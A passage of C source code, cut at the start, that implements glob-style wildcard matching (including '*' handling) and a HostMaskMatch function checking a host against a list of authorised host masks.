            }
        }
      (*wildcard)++;
      at_beginning = 0;
    }
  if (1 == negation)
    fit = 1 - fit;
  if (1 == fit) 
    (*test)++;

  return (fit);
}

int asterisk (char **wildcard, char **test)
{
  int fit = 1;

  (*wildcard)++; 
  while (('\000' != (**test))
	 && (('?' == **wildcard) 
	     || ('*' == **wildcard)))
    {
      if ('?' == **wildcard) 
	(*test)++;
      (*wildcard)++;
    }
  while ('*' == (**wildcard))
    (*wildcard)++;

  if (('\0' == (**test)) && ('\0' != (**wildcard)))
    return (fit = 0);
  if (('\0' == (**test)) && ('\0' == (**wildcard)))
    return (fit = 1); 
  else
    {
      if (0 == wildcardfit(*wildcard, (*test)))
	{
	  do                               //  dont recode it isnt funny
	    {
	      (*test)++;
	      while (((**wildcard) != (**test)) 
		     && ('['  != (**wildcard))
		     && ('\0' != (**test)))
		(*test)++;
	    }
	  while ((('\0' != **test))? 
		 (0 == wildcardfit (*wildcard, (*test))) 
		 : (0 != (fit = 0)));
	}
      if (('\0' == **test) && ('\0' == **wildcard))
	fit = 1;
      return (fit);
    }
}

int HostMaskMatch(char *h)
{
   int i=0;

   while (authost[i][0])
      if (wildcardfit(authost[i++], h)) return 1;

   return 0;
}